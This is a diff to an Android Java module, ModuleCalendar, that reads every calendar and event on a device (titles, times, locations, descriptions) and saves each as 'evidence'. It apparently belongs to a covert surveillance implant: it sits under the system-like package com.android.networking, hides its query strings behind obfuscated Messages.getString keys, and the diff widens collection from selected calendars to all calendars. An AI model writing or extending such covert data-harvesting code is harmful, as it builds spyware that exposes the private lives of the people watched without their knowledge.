@@ -2,9 +2,11 @@ package com.android.networking.module;
 
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.HashSet;
+import java.util.List;
 
 import android.content.ContentResolver;
 import android.content.Context;
@@ -140,11 +142,13 @@ public class ModuleCalendar extends BaseModule {
 		// http://forum.xda-developers.com/showthread.php?t=688095
 		// /data/data/com.android.providers.calendar/databases/calendar.db
 		// backup/data/calendar.db
-		// v4: http://stackoverflow.com/questions/10069319/how-to-get-device-calendar-event-list-in-android-device
+		// v4:
+		// http://stackoverflow.com/questions/10069319/how-to-get-device-calendar-event-list-in-android-device
 
-		HashSet<String> calendars;
+		List<String> calendars;
 		String contentProvider;
 
+		// d_18=content://calendar
 		contentProvider = Messages.getString("d_18"); //$NON-NLS-1$
 		calendars = selectCalendars(contentProvider);
 
@@ -152,6 +156,7 @@ public class ModuleCalendar extends BaseModule {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (calendar): opening 2.2 style"); //$NON-NLS-1$
 			}
+			// d_19=content://com.android.calendar
 			contentProvider = Messages.getString("d_19"); //$NON-NLS-1$
 			calendars = selectCalendars(contentProvider);
 		} else {
@@ -172,8 +177,21 @@ public class ModuleCalendar extends BaseModule {
 			Uri.Builder builder = Uri.parse(contentProvider + Messages.getString("d_17")).buildUpon(); //$NON-NLS-1$
 			String textUri = builder.build().toString();
 
-			Cursor eventCursor = managedQuery(builder.build(), new String[] { Messages.getString("d_7"), Messages.getString("d_8"), Messages.getString("d_9"), Messages.getString("d_10"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-					Messages.getString("d_11"), Messages.getString("d_12"), Messages.getString("d_13"), Messages.getString("d_14") }, Messages.getString("d_15") + "=" + id, null, Messages.getString("d_16")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
+			// d_7=_id
+			// d_8=title
+			// d_9=dtstart
+			// d_10=dtend
+			// d_11=rrule
+			// d_12=allDay
+			// d_13=eventLocation
+			// d_14=description
+			// d_15=calendar_id
+
+			Cursor eventCursor = managedQuery(
+					builder.build(),
+					new String[] {
+							Messages.getString("d_7"), Messages.getString("d_8"), Messages.getString("d_9"), Messages.getString("d_10"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+							Messages.getString("d_11"), Messages.getString("d_12"), Messages.getString("d_13"), Messages.getString("d_14") }, Messages.getString("d_15") + "=" + id, null, Messages.getString("d_16")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
 
 			while (eventCursor.moveToNext()) {
 				int index = 0;
@@ -225,39 +243,41 @@ public class ModuleCalendar extends BaseModule {
 					calendar.put(idEvent, crcNew);
 					saveEvidenceCalendar(idEvent, packet);
 					needToSerialize = true;
-					//Thread.yield();
+					// Thread.yield();
 				}
 			}
 		}
 		return needToSerialize;
 	}
+	
+	private ArrayList<String> selectCalendars(String contentProvider) {
+		try {
+			String[] projection = new String[] { Messages.getString("d_3") }; //$NON-NLS-1$
+			// Uri calendars = Uri.parse("content://calendar/calendars");
+			Uri calendars = Uri.parse(contentProvider + Messages.getString("d_2")); //$NON-NLS-1$
 
-	private HashSet<String> selectCalendars(String contentProvider) {
-		String[] projection = new String[] { Messages.getString("d_3"), Messages.getString("d_4"), Messages.getString("d_5"), Messages.getString("d_6") }; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-		// Uri calendars = Uri.parse("content://calendar/calendars");
-		Uri calendars = Uri.parse(contentProvider + Messages.getString("d_2")); //$NON-NLS-1$
+			ArrayList<String> calendarIds = new ArrayList<String>();
 
-		HashSet<String> calendarIds = new HashSet<String>();
+			Cursor managedCursor = managedQuery(calendars, projection, null, null, null); //$NON-NLS-1$
 
-		Cursor managedCursor = managedQuery(calendars, projection, "selected=1", null, null); //$NON-NLS-1$
+			while (managedCursor != null && managedCursor.moveToNext()) {
 
-		while (managedCursor != null && managedCursor.moveToNext()) {
+				final String _id = managedCursor.getString(0);
 
-			final String _id = managedCursor.getString(0);
-			final String displayName = managedCursor.getString(1);
-			final Boolean selected = !managedCursor.getString(2).equals("0"); //$NON-NLS-1$
-			final String ownerAccount = managedCursor.getString(2);
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (selectCalendars): Id: " + _id); //$NON-NLS-1$
+				}
 
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (selectCalendars): Id: " + _id + " Display Name: " + displayName + " Selected: " //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
-						+ selected + " OwnerAccount: " + ownerAccount); //$NON-NLS-1$
+				calendarIds.add(_id);
 			}
 
-			calendarIds.add(_id);
+			return calendarIds;
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(ex);
+			}
+			return null;
 		}
-
-		return calendarIds;
-
 	}
 
 	private Cursor managedQuery(Uri calendars, String[] projection, String selection, String[] selectionArgs,
@@ -327,7 +347,7 @@ public class ModuleCalendar extends BaseModule {
 				if (description == null) {
 					description = Messages.getString("d_0") + rrule; //$NON-NLS-1$
 				} else {
-					description += " \n"+  Messages.getString("d_0") + rrule; //$NON-NLS-1$
+					description += " \n" + Messages.getString("d_0") + rrule; //$NON-NLS-1$
 				}
 			}
 
